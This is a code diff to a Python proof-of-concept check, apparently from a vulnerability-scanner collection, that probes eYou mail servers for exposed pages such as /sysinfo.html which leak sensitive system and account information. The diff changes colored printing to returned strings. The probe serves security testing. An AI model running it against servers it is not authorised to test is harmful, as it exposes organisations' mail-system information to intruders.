@@ -8,8 +8,8 @@ description: 亿邮邮件系统存在弱口令账户信息泄露，导致非法�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class eyou_weakpass_BaseVerify:
     def __init__(self, url):
@@ -21,22 +21,22 @@ class eyou_weakpass_BaseVerify:
         try:
             req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
             if req.status_code == 200 and r"@" in req.text:
-                cprint("[+]存在eyou邮件系统信息泄露...(敏感信息)\tpayload: "+vulnurl, "green")
+                return "[+]存在eyou邮件系统信息泄露...(敏感信息)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
         payload = "/sysinfo.html"
         vulnurl = self.url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
             if req.status_code == 200 and r"系统基本信息检查" in req.text:
-                cprint("[+]存在eyou邮件系统信息泄露...(敏感信息)\tpayload: "+vulnurl, "green")
+                return "[+]存在eyou邮件系统信息泄露...(敏感信息)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = eyou_weakpass_BaseVerify(sys.argv[1])
     testVuln.run()
